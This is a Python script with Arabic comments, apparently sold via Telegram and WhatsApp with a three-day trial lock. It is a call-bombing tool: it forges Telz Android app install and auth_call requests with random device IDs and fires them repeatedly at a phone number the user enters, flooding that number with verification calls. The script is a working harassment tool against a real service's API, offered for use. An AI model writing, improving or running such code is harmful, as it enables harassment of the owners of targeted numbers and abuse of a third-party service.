# تغير الحقوق تبق بتتناااااااااااااااااالهم اني صائم 
#𝕄ℝ ℂ𝕆𝔻𝔼
import os
import sys
import json
import base64
from datetime import datetime, timedelta

# ملف تخزين وقت التفعيل
activation_file = "activation_data.json"

# التحقق مما إذا كان هناك وقت تفعيل مسجل
if os.path.exists(activation_file):
    with open(activation_file, "r") as f:
        data = json.load(f)
        activation_time = datetime.strptime(base64.b64decode(data["activation_time"]).decode(), "%Y-%m-%d %H:%M:%S")
else:
    # إذا لم يكن هناك وقت تفعيل، يتم تحديد وقت التفعيل الآن
    activation_time = datetime.now()
    with open(activation_file, "w") as f:
        json.dump({"activation_time": base64.b64encode(activation_time.strftime("%Y-%m-%d %H:%M:%S").encode()).decode()}, f)

# حساب تاريخ انتهاء الصلاحية (بعد 3 أيام من التفعيل)
expiry_date = activation_time + timedelta(days=3)

# التحقق من التلاعب بالتاريخ
if datetime.now() < activation_time:
    print("❌ تم اكتشاف تلاعب في تاريخ الجهاز! لا يمكنك تشغيل الأداة.")
    sys.exit(0)

# التحقق مما إذا انتهت المهلة
if datetime.now() > expiry_date:
    print("""
    ❌ تم انتهاء الفترة المجانية، يرجى شحن الأداة من المطور.
    📞 للتواصل عبر واتساب: +201226499832
    📩 للتواصل عبر تيليجرام: @y_e2u
    """)
    sys.exit(0)

print("✅ تم تفعيل الأداة بنجاح، يمكنك استخدامها حتى", expiry_date.strftime("%Y-%m-%d %H:%M:%S"))

# ------------------------------
# باقي كود الأداة الأصلي هنا 👇
# ------------------------------

def main():
    print("🚀 الأداة تعمل بشكل طبيعي ضمن الفترة المسموح بها!")

if __name__ == "__main__":
    main()

import pyfiglet
from termcolor import colored
import requests
import json
import random
import string
import time
import uuid

def generate_unique_ids():
    """توليد معرفات فريدة للتثبيت."""
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def send_install_request(url, headers, payload):
    """إرسال طلب التثبيت."""
    try:
        response = requests.post(url, data=payload, headers=headers)
        if response.ok and "ok" in response.text:
            return True
        else:
            print(f"Install request failed: {response.json().get('status', 'Unknown error')}")
            return False
    except Exception as e:
        print(f"Error during install request: {e}")
        return False

def send_auth_call_request(url, headers, payload):
    """إرسال طلب المكالمة."""
    try:
        response = requests.post(url, data=payload, headers=headers)
        if response.ok and "ok" in response.text:
            return True
        else:
            print(f"Auth call request failed: {response.json().get('status', 'Unknown error')}")
            return False
    except Exception as e:
        print(f"Error during auth call request: {e}")
        return False

if __name__ == "__main__":
    # تصميم الشعار الكبير
    ascii_art = pyfiglet.figlet_format("Mrcode")
    colored_art = colored(ascii_art, "red", attrs=["bold"])  # كلمة KING باللون الأحمر
    print(colored_art)

    # النصوص المرافقة
    print(colored("HE WAS THE SILINCE BEFORE THE STORM💀🔥", "yellow", attrs=["bold"]))
    print(colored("معرف التلي حقي @y_e2u", "cyan", attrs=["bold", "underline"]))
    print()

    # إدخال الرقم وعدد المحاولات
    number = input(colored("Enter Your Number: ", "green", attrs=["bold"]))
    repeat_count = int(input(colored("Enter the number to send: ", "green", attrs=["bold"])))

    # إعداد المعرفات الفريدة
    foxx, fox, foxer = generate_unique_ids()

    # عنوان واجهة التثبيت
    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"

    # إعداد ترويسة الطلب
    headers = {
        'User-Agent': "Telz-Android/17.5.17",
        'Content-Type': "application/json"
    }

    # إعداد حمولة التثبيت
    payload_install = json.dumps({
        "android_id": fox,
        "app_version": "17.5.17",
        "event": "install",
        "google_exists": "yes",
        "os": "android",
        "os_version": "9",
        "play_market": True,
        "ts": foxx,
        "uuid": str(foxer)
    })

    for i in range(repeat_count):
        if send_install_request(install_url, headers, payload_install):
            # إذا نجح التثبيت، أرسل طلب المكالمة
            payload_auth_call = json.dumps({
                "android_id": fox,
                "app_version": "17.5.17",
                "attempt": "0",
                "event": "auth_call",
                "lang": "ar",
                "os": "android",
                "os_version": "9",
                "phone": f"+2{number}",
                "ts": foxx,
                "uuid": str(foxer)
            })

            if send_auth_call_request(auth_call_url, headers, payload_auth_call):
                print(colored(f"Done sending call {i + 1}/{repeat_count}", "green"))
            else:
                print(colored(f"Failed attempt {i + 1}/{repeat_count}, try again after 5 minutes.", "red"))
        else:
            print(colored(f"Install request failed on attempt {i + 1}/{repeat_count}.", "red"))
        
        time.sleep(2)   
        time.sleep(2)
        
        
        